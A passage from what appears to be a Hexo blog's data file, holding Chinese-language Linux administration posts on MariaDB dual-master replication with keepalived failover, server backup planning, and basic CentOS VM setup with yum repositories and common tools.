\\G;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/06/04/keepalived-linux/4.png\" alt=\"mariadb-2 复制成功\"></p>\n<p>看到图中的两个yes，代表一边的复制功能就配置完成了。</p>\n<ol start=\"8\">\n<li>然后在mariadb-2 服务器上也创建一个授权账户。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grant replication slave on *.* to <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;172.21.8.33&#x27;</span> identified by <span class=\"string\">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>授权为对方的IP</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show master status;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/06/04/keepalived-linux/5.png\" alt=\"mariadb-2 master status\"></p>\n<p>再次回到mariadb-1上，连接mariadb-2，实现复制功能。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">change master to master_host = &#x27;172.21.8.34&#x27;,master_user = &#x27;slave&#x27;,master_password = &#x27;123&#x27;,master_log_file = &#x27;master.000003&#x27;,master_log_pos = 338;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"9\">\n<li>配置完成后，开启slave功能，查看slave状态。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">start slave;</span><br><span class=\"line\">show slave status \\G;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/06/04/keepalived-linux/6.png\" alt=\"mariadb-1 复制成功\"></p>\n<p>到这里数据库的主从复制已经完成了，接下来要配置数据库的keepalived功能。</p>\n<h4 id=\"keepalived配置\"><a href=\"#keepalived配置\" class=\"headerlink\" title=\"keepalived配置\"></a>keepalived配置</h4><ol>\n<li>主机 DB-master 和 DB-slave 上安装 Keepalived</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y keepalived</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>把配置文件保留一个副本</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /etc/keepalived/keepalived.conf&#123;,.bak&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>修改两个主机上的配置文件&#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">route_id</th>\n<th align=\"center\">vrrp_instance</th>\n<th align=\"center\">state</th>\n<th align=\"center\">interface</th>\n<th align=\"center\">virtual_router_id</th>\n<th align=\"center\">priority</th>\n<th align=\"center\">virtual_ipaddress</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">mariadb-1</td>\n<td align=\"center\">db_master</td>\n<td align=\"center\">mariadb-ha</td>\n<td align=\"center\">BACKUP</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">60</td>\n<td align=\"center\">100</td>\n<td align=\"center\">172.21.8.33&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">mariadb-2</td>\n<td align=\"center\">db_slave</td>\n<td align=\"center\">mariadb-ha</td>\n<td align=\"center\">BACKUP</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">60</td>\n<td align=\"center\">90</td>\n<td align=\"center\">172.21.8.34&#x2F;24</td>\n</tr>\n</tbody></table>\n<ul>\n<li>mariadb-1 的<code>/etc/keepalived/keepalived.conf</code> 的内容如下</li>\n</ul>\n<p>全局配置模块</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">! Configuration File <span class=\"keyword\">for</span> keepalived</span><br><span class=\"line\"></span><br><span class=\"line\">global_defs &#123;</span><br><span class=\"line\">   notification_email &#123;</span><br><span class=\"line\">     liuxp731@qq.com\t<span class=\"comment\"># 管理员邮箱</span></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class=\"line\">   smtp_server 127.0.0.1</span><br><span class=\"line\">   smtp_connect_timeout 30</span><br><span class=\"line\">   router_id db_master\t<span class=\"comment\"># 标识</span></span><br><span class=\"line\">   vrrp_skip_check_adv_addr</span><br><span class=\"line\">   vrrp_strict</span><br><span class=\"line\">   vrrp_garp_interval 0</span><br><span class=\"line\">   vrrp_gna_interval 0</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>启用 vrrp_script 模块， 定义对 mariadb 服务的监测</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vrrp_script check_mariadb &#123;</span><br><span class=\"line\">   script <span class=\"string\">&quot;/etc/keepalived/checkmariadb.sh&quot;</span></span><br><span class=\"line\">   interval 2</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>VRRPD 配置段  </p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vrrp_instance mariadb-ha &#123;</span><br><span class=\"line\">    state BACKUP\t<span class=\"comment\"># 备用</span></span><br><span class=\"line\">    interface ens224</span><br><span class=\"line\">    nopreempt\t\t<span class=\"comment\"># 设置不抢占</span></span><br><span class=\"line\">    virtual_router_id 60</span><br><span class=\"line\">    priority 100\t<span class=\"comment\"># 优先级</span></span><br><span class=\"line\">    advert_int 1</span><br><span class=\"line\">    authentication &#123;</span><br><span class=\"line\">        auth_type PASS</span><br><span class=\"line\">        auth_pass 1111</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    track_script &#123;\t<span class=\"comment\"># 配合vrrp_script段使用</span></span><br><span class=\"line\">        check_mariadb</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    virtual_ipaddress &#123;\t<span class=\"comment\"># 虚拟出的VIP</span></span><br><span class=\"line\">        172.21.8.50/24</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>mariadb-2 的<code>/etc/keepalived/keepalived.conf</code> 的内容如下</li>\n</ul>\n<p>全局配置段</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">! Configuration File <span class=\"keyword\">for</span> keepalived</span><br><span class=\"line\"></span><br><span class=\"line\">global_defs &#123;</span><br><span class=\"line\">   notification_email &#123;</span><br><span class=\"line\">     liuxp731@qq.com</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class=\"line\">   smtp_server 127.0.0.1</span><br><span class=\"line\">   smtp_connect_timeout 30</span><br><span class=\"line\">   router_id db_slave</span><br><span class=\"line\">   vrrp_skip_check_adv_addr</span><br><span class=\"line\">   vrrp_strict</span><br><span class=\"line\">   vrrp_garp_interval 0</span><br><span class=\"line\">   vrrp_gna_interval 0</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>启用 vrrp_script 模块， 定义对 mariadb 服务的监测</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vrrp_script check_mariadb &#123;</span><br><span class=\"line\">   script <span class=\"string\">&quot;/etc/keepalived/checkmariadb.sh&quot;</span></span><br><span class=\"line\">   interval 2</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>VRRPD 配置段</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vrrp_instance mariadb-ha &#123;</span><br><span class=\"line\">    state BACKUP</span><br><span class=\"line\">    interface ens224</span><br><span class=\"line\">    virtual_router_id 60</span><br><span class=\"line\">    priority 90</span><br><span class=\"line\">    advert_int 1</span><br><span class=\"line\">    authentication &#123;</span><br><span class=\"line\">        auth_type PASS</span><br><span class=\"line\">        auth_pass 1111</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    track_script &#123;</span><br><span class=\"line\">        check_mariadb</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    virtual_ipaddress &#123;</span><br><span class=\"line\">        172.21.8.50/24</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>在两个主机上编写服务检测脚本<code>/etc/keepalived/checkmariadb.sh</code></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ! lsof -i:3306 &amp;&gt; /dev/null</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    systemctl stop keepalived</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>启动两台服务器的<code>keepalived</code></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start keepalived.service</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/06/04/keepalived-linux/7.png\" alt=\"keepalived 配置成功\"></p>\n<p>可以看出mariadb-1主机已经多出来一个172.21.8.50&#x2F;24的一个IP，这个就是虚拟出来的VIP，当mariadb-1主机宕掉，这个IP就会漂移到mariadb-2主机上，到这里就完成了mariadb双主复制和keepalived的实现。</p>"},{"title":"为Linux设置一套合理的备份方案","date":"2023-10-04T12:48:42.000Z","_content":"\n倘若服务器没有任何的备份策略，要为它设计一份备份策略，可以从以下的角度进行考虑，分析，着手设计。\n\n<!-- more -->\n\n### 重要系统目录\n\n对于任何服务器来讲都需要注意备份的系统目录：\n\n```bash\n/etc\n/root\n/home\n/var/spool/at\n/var/spool/cron\n/var/spool/mail\n```\n\n### 其他配置目录\n\n其二，要根据服务器的作用来考虑额外需要备份的配置文件。需要注意的一点，在安装软件包时，采取的安装方式不一样，软件包的配置目录也不一样，比如NGINX，采取源码安装，配置路径为`/usr/local/nginx`；RPM包安装的NGINX，配置路径为`/etc/nginx`。清楚配置文件路径的差异，按照实际情况指定备份策略。\n\n除了服务的配置文件，例如Apache服务的**站点内容**和生成的**日志文件**，也要进行备份。\n\n### 备份策略设计\n\n备份方式主要有：完整备份、增量备份、差异备份，可以根据具体的业务需求制定不同的备份策略，满足实际的需要。\n\n关于备份方式的详细介绍，点击链接查看[**完整备份、增量备份、差异备份**](https://nustarain.gitee.io/2023/10/04/backup-style/)详细解读。\n\n### 备份存储位置\n\n1. 离线备份：将备份数据存储在离线介质上，如外部硬盘、磁带或光盘。离线备份可以防止备份数据受到网络攻击或恶意软件的影响。\n\n2. 远程备份：将备份数据存储在物理上分离的远程位置。这有助于防止自然灾害、盗窃或设备故障等情况下的数据丢失。\n\n3. 云备份：使用云存储服务作为备份储存位置，如Amazon S3、Google Cloud Storage、Microsoft Azure Blob Storage等。云备份提供了高可用性和灵活性，并可根据需求进行扩展。\n\n4. 本地备份：将备份数据存储在本地服务器或存储设备上。这提供了快速的数据恢复能力，但需要处理本地存储风险。\n\n最终的备份储存位置设计应根据组织的需求、风险承受能力和预算来确定。通常，采用混合备份策略，结合离线备份、远程备份和云备份，可以提供高级别的数据保护和恢复能力。此外，应定期评估备份策略，以确保其与组织的需求和技术环境保持一致。","source":"_posts/linux-backup.md","raw":"---\ntitle: 为Linux设置一套合理的备份方案\ndate: 2023-10-04 20:48:42\ncategories: \n  - 理论知识\ntags:\n  - Linux\n  - 面试\n---\n\n倘若服务器没有任何的备份策略，要为它设计一份备份策略，可以从以下的角度进行考虑，分析，着手设计。\n\n<!-- more -->\n\n### 重要系统目录\n\n对于任何服务器来讲都需要注意备份的系统目录：\n\n```bash\n/etc\n/root\n/home\n/var/spool/at\n/var/spool/cron\n/var/spool/mail\n```\n\n### 其他配置目录\n\n其二，要根据服务器的作用来考虑额外需要备份的配置文件。需要注意的一点，在安装软件包时，采取的安装方式不一样，软件包的配置目录也不一样，比如NGINX，采取源码安装，配置路径为`/usr/local/nginx`；RPM包安装的NGINX，配置路径为`/etc/nginx`。清楚配置文件路径的差异，按照实际情况指定备份策略。\n\n除了服务的配置文件，例如Apache服务的**站点内容**和生成的**日志文件**，也要进行备份。\n\n### 备份策略设计\n\n备份方式主要有：完整备份、增量备份、差异备份，可以根据具体的业务需求制定不同的备份策略，满足实际的需要。\n\n关于备份方式的详细介绍，点击链接查看[**完整备份、增量备份、差异备份**](https://nustarain.gitee.io/2023/10/04/backup-style/)详细解读。\n\n### 备份存储位置\n\n1. 离线备份：将备份数据存储在离线介质上，如外部硬盘、磁带或光盘。离线备份可以防止备份数据受到网络攻击或恶意软件的影响。\n\n2. 远程备份：将备份数据存储在物理上分离的远程位置。这有助于防止自然灾害、盗窃或设备故障等情况下的数据丢失。\n\n3. 云备份：使用云存储服务作为备份储存位置，如Amazon S3、Google Cloud Storage、Microsoft Azure Blob Storage等。云备份提供了高可用性和灵活性，并可根据需求进行扩展。\n\n4. 本地备份：将备份数据存储在本地服务器或存储设备上。这提供了快速的数据恢复能力，但需要处理本地存储风险。\n\n最终的备份储存位置设计应根据组织的需求、风险承受能力和预算来确定。通常，采用混合备份策略，结合离线备份、远程备份和云备份，可以提供高级别的数据保护和恢复能力。此外，应定期评估备份策略，以确保其与组织的需求和技术环境保持一致。","slug":"linux-backup","published":1,"updated":"2024-05-03T03:55:54.877Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fz006m7zj3b0w37uwd","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>倘若服务器没有任何的备份策略，要为它设计一份备份策略，可以从以下的角度进行考虑，分析，着手设计。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"重要系统目录\"><a href=\"#重要系统目录\" class=\"headerlink\" title=\"重要系统目录\"></a>重要系统目录</h3><p>对于任何服务器来讲都需要注意备份的系统目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc</span><br><span class=\"line\">/root</span><br><span class=\"line\">/home</span><br><span class=\"line\">/var/spool/at</span><br><span class=\"line\">/var/spool/cron</span><br><span class=\"line\">/var/spool/mail</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"其他配置目录\"><a href=\"#其他配置目录\" class=\"headerlink\" title=\"其他配置目录\"></a>其他配置目录</h3><p>其二，要根据服务器的作用来考虑额外需要备份的配置文件。需要注意的一点，在安装软件包时，采取的安装方式不一样，软件包的配置目录也不一样，比如NGINX，采取源码安装，配置路径为<code>/usr/local/nginx</code>；RPM包安装的NGINX，配置路径为<code>/etc/nginx</code>。清楚配置文件路径的差异，按照实际情况指定备份策略。</p>\n<p>除了服务的配置文件，例如Apache服务的<strong>站点内容</strong>和生成的<strong>日志文件</strong>，也要进行备份。</p>\n<h3 id=\"备份策略设计\"><a href=\"#备份策略设计\" class=\"headerlink\" title=\"备份策略设计\"></a>备份策略设计</h3><p>备份方式主要有：完整备份、增量备份、差异备份，可以根据具体的业务需求制定不同的备份策略，满足实际的需要。</p>\n<p>关于备份方式的详细介绍，点击链接查看<a href=\"https://nustarain.gitee.io/2023/10/04/backup-style/\"><strong>完整备份、增量备份、差异备份</strong></a>详细解读。</p>\n<h3 id=\"备份存储位置\"><a href=\"#备份存储位置\" class=\"headerlink\" title=\"备份存储位置\"></a>备份存储位置</h3><ol>\n<li><p>离线备份：将备份数据存储在离线介质上，如外部硬盘、磁带或光盘。离线备份可以防止备份数据受到网络攻击或恶意软件的影响。</p>\n</li>\n<li><p>远程备份：将备份数据存储在物理上分离的远程位置。这有助于防止自然灾害、盗窃或设备故障等情况下的数据丢失。</p>\n</li>\n<li><p>云备份：使用云存储服务作为备份储存位置，如Amazon S3、Google Cloud Storage、Microsoft Azure Blob Storage等。云备份提供了高可用性和灵活性，并可根据需求进行扩展。</p>\n</li>\n<li><p>本地备份：将备份数据存储在本地服务器或存储设备上。这提供了快速的数据恢复能力，但需要处理本地存储风险。</p>\n</li>\n</ol>\n<p>最终的备份储存位置设计应根据组织的需求、风险承受能力和预算来确定。通常，采用混合备份策略，结合离线备份、远程备份和云备份，可以提供高级别的数据保护和恢复能力。此外，应定期评估备份策略，以确保其与组织的需求和技术环境保持一致。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>倘若服务器没有任何的备份策略，要为它设计一份备份策略，可以从以下的角度进行考虑，分析，着手设计。</p>","more":"<h3 id=\"重要系统目录\"><a href=\"#重要系统目录\" class=\"headerlink\" title=\"重要系统目录\"></a>重要系统目录</h3><p>对于任何服务器来讲都需要注意备份的系统目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc</span><br><span class=\"line\">/root</span><br><span class=\"line\">/home</span><br><span class=\"line\">/var/spool/at</span><br><span class=\"line\">/var/spool/cron</span><br><span class=\"line\">/var/spool/mail</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"其他配置目录\"><a href=\"#其他配置目录\" class=\"headerlink\" title=\"其他配置目录\"></a>其他配置目录</h3><p>其二，要根据服务器的作用来考虑额外需要备份的配置文件。需要注意的一点，在安装软件包时，采取的安装方式不一样，软件包的配置目录也不一样，比如NGINX，采取源码安装，配置路径为<code>/usr/local/nginx</code>；RPM包安装的NGINX，配置路径为<code>/etc/nginx</code>。清楚配置文件路径的差异，按照实际情况指定备份策略。</p>\n<p>除了服务的配置文件，例如Apache服务的<strong>站点内容</strong>和生成的<strong>日志文件</strong>，也要进行备份。</p>\n<h3 id=\"备份策略设计\"><a href=\"#备份策略设计\" class=\"headerlink\" title=\"备份策略设计\"></a>备份策略设计</h3><p>备份方式主要有：完整备份、增量备份、差异备份，可以根据具体的业务需求制定不同的备份策略，满足实际的需要。</p>\n<p>关于备份方式的详细介绍，点击链接查看<a href=\"https://nustarain.gitee.io/2023/10/04/backup-style/\"><strong>完整备份、增量备份、差异备份</strong></a>详细解读。</p>\n<h3 id=\"备份存储位置\"><a href=\"#备份存储位置\" class=\"headerlink\" title=\"备份存储位置\"></a>备份存储位置</h3><ol>\n<li><p>离线备份：将备份数据存储在离线介质上，如外部硬盘、磁带或光盘。离线备份可以防止备份数据受到网络攻击或恶意软件的影响。</p>\n</li>\n<li><p>远程备份：将备份数据存储在物理上分离的远程位置。这有助于防止自然灾害、盗窃或设备故障等情况下的数据丢失。</p>\n</li>\n<li><p>云备份：使用云存储服务作为备份储存位置，如Amazon S3、Google Cloud Storage、Microsoft Azure Blob Storage等。云备份提供了高可用性和灵活性，并可根据需求进行扩展。</p>\n</li>\n<li><p>本地备份：将备份数据存储在本地服务器或存储设备上。这提供了快速的数据恢复能力，但需要处理本地存储风险。</p>\n</li>\n</ol>\n<p>最终的备份储存位置设计应根据组织的需求、风险承受能力和预算来确定。通常，采用混合备份策略，结合离线备份、远程备份和云备份，可以提供高级别的数据保护和恢复能力。此外，应定期评估备份策略，以确保其与组织的需求和技术环境保持一致。</p>"},{"title":"新的Linux虚拟机快速基本配置","date":"2023-05-18T01:54:34.000Z","_content":"\n### 配置阿里yum源\n\n1. 首先保证虚拟机可以正常访问网络。\n2. 执行命令，下载yum源。(CENTOS-7)\n\n```bash\ncurl -o /etc/yum.repos.d/aliyun.repo http://mirrors.aliyun.com/repo/Centos-7.repo\n```\n\nCENTOS-8 yum源\n\n```bash\ncurl -o /etc/yum.repos.d/aliyun.repo http://mirrors.aliyun.com/repo/Centos-8.repo\n```\n\n<!-- more -->\n\n3. 清除yum缓存，重新生成。\n\n```bash\nyum clean all && yum makecache\n```\n\nPS:\n\n**CENTOS-7和CENTOS-8的yum源最好不要混着使用，是什么版本就用什么版本。**\n\n### 必备的软件\n\n1. **vim工具**，最小化环境是没有vim的，vim和vi的区别在最小化环境里表现的就是配置文档的高亮显示了，强烈建议安装vim。\n\n```bash\nyum install -y vim\n```\n\n2. **wget**工具，用来下载一些网络资源，同样最小化是没有的，所以要下载一个。\n\n```bash\nyum install -y wget\n```\n\n3. **bash-completion**包，从名字就可以看出来，这是用来命令补全的，简直不要太好用，<kbd>Tab</kbd>键爱好者狂喜。\n\n```bash\nyum install -y bash-completion\n``` \n\n4. **tree工具**，使用图形的方式展示目录下的文件结构，不用的时候吃灰也不会少，用的时候就知道这个的好处了。\n\n```bash\nyum install -y tree\n```\n\n6. **net-tools**，这个工具提供了比如`ifconfig`，`netstat`，`arp`，`route`命令，有时候用起来发现没有这个命令的话，记得安装这个包。\n\n```bash\nyum install -y net-tools\n```\n\n5. **lsof工具**，查看端口监听的常用工具，个人来讲使用频率高于`netstat`，使用也比较方便，可以安装一个。\n\n```bash\nyum install -y lsof\n```\n\n配置完这些，基础的东西就可以告一段落了。","source":"_posts/linux-init.md","raw":"---\ntitle: 新的Linux虚拟机快速基本配置\ndate: 2023-05-18 09:54:34\ncategories: 小玩意儿\ntags:\n  - Linux\n---\n\n### 配置阿里yum源\n\n1. 首先保证虚拟机可以正常访问网络。\n2. 执行命令，下载yum源。(CENTOS-7)\n\n```bash\ncurl -o /etc/yum.repos.d/aliyun.repo http://mirrors.aliyun.com/repo/Centos-7.repo\n```\n\nCENTOS-8 yum源\n\n```bash\ncurl -o /etc/yum.repos.d/aliyun.repo http://mirrors.aliyun.com/repo/Centos-8.repo\n```\n\n<!-- more -->\n\n3. 清除yum缓存，重新生成。\n\n```bash\nyum clean all && yum makecache\n```\n\nPS:\n\n**CENTOS-7和CENTOS-8的yum源最好不要混着使用，是什么版本就用什么版本。**\n\n### 必备的软件\n\n1. **vim工具**，最小化环境是没有vim的，vim和vi的区别在最小化环境里表现的就是配置文档的高亮显示了，强烈建议安装vim。\n\n```bash\nyum install -y vim\n```\n\n2. **wget**工具，用来下载一些网络资源，同样最小化是没有的，所以要下载一个。\n\n```bash\nyum install -y wget\n```\n\n3. **bash-completion**包，从名字就可以看出来，这是用来命令补全的，简直不要太好用，<kbd>Tab</kbd>键爱好者狂喜。\n\n```bash\nyum install -y bash-completion\n``` \n\n4. **tree工具**，使用图形的方式展示目录下的文件结构，不用的时候吃灰也不会少，用的时候就知道这个的好处了。\n\n```bash\nyum install -y tree\n```\n\n6. **net-tools**，这个工具提供了比如`ifconfig`，`netstat`，`arp`，`route`命令，有时候用起来发现没有这个命令的话，记得安装这个包。\n\n```bash\nyum install -y net-tools\n```\n\n5. **lsof工具**，查看端口监听的常用工具，个人来讲使用频率高于`netstat`，使用也比较方便，可以安装一个。\n\n```bash\nyum install -y lsof\n```\n\n配置完这些，基础的东西就可以告一段落了。","slug":"linux-init","published":1,"updated":"2024-05-03T03:55:54.877Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5g0006p7zj3ayfk3dnz","content":"<link rel=\"stylesheet\" 